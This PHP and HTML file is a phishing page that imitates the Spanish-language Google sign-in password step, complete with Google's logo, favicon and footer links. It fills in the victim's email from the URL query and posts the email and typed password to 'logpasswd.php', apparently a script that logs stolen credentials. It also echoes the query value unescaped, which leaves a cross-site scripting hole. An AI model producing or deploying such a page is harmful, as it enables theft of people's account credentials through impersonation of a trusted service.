<?php

  if (empty($_GET)) {
    header('Location: email.html');
  } else {
    $username = $_GET['username'];
  }

?>
<html>

<head>
  <meta charset="utf-8">
  <title>Inicia sesión: Cuentas de Google</title>
  <link rel="icon" type="image/png" href="//www.google.com/favicon.ico" />
  <link rel="stylesheet" type="text/css" href="google.css" />
</head>

<body>
  <div class="login-container">
    <div class="login-header">
      <form class="login-form" action="logpasswd.php" method="post">
        <br>
        <br>
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
        <h1>Te damos la Bienvenida</h1>
        <br>
        <input type="email" class="dropemail" name="username" required value="<?php echo $username; ?>">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewBox="0 0 16 16">
        <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"/>
        <path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"/>
        </svg>
        <input type="password" name="password" placeholder="Introduce tu contraseña" required>
        <div class="checkboxpsswd"><input type="checkbox" class="checkboxpasswd" name="checkbox" placeholder="">Mostrar contraseña</div>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <div class="div-button">
          <a href="">¿Has olvidado tu contraseña?</a> <button class="next-button" type="submit">Siguiente</button>
        </div>
    </div>
    </form>
    <div class="menu-inferior">
      <div class="language-menu">
        <button class="language-button">
          <span class="language-label">Español (España)</span>
          <svg viewBox="0 0 24 24" class="language-icon">
            <path fill="#000000" d="M7,10L12,15L17,10H7Z" />
          </svg>
        </button>
      </div>
      <span class="separador"></span>
      <span class="nav-inferior">Ayuda</span>
      <span class="nav-inferior">Privacidad</span>
      <span class="nav-inferior">Términos</span>

    </div>
  </div>
  </div>
</body>


</html>
